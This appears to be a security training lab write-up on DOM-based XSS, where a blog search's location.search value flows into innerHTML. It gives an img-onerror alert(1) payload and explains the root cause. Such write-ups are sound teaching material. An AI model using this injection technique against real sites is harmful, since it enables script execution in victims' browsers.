# Lab : DOM XSS in innerHTML Sink Using Source location.search


This lab contains a **DOM-Based XSS** vulnerability in the blog search functionality. The application takes user input from the URL and inserts it into the page using the `innerHTML` property without proper sanitization.

## Analysis

### Source

```javascript
location.search
```

### Sink

```javascript
element.innerHTML
```

The search term is retrieved from the URL and assigned directly to an element's `innerHTML`. Since `innerHTML` parses HTML content, an attacker can inject malicious HTML and JavaScript.

## Exploitation

Payload:

```html
<img src=1 onerror=alert(1)>
```

Enter the payload into the search box and click **Search**.

## Result

The application inserts the payload into the page using `innerHTML`:

```html
<img src=1 onerror=alert(1)>
```

Since the image source is invalid, the `onerror` event is triggered, executing:

```javascript
alert(1)
```

This confirms the presence of a DOM-Based XSS vulnerability and solves the lab.

The vulnerability occurs because user-controlled input from `location.search` is inserted directly into the DOM using `innerHTML` without validation or encoding. This allows an attacker to execute arbitrary JavaScript in the victim's browser.
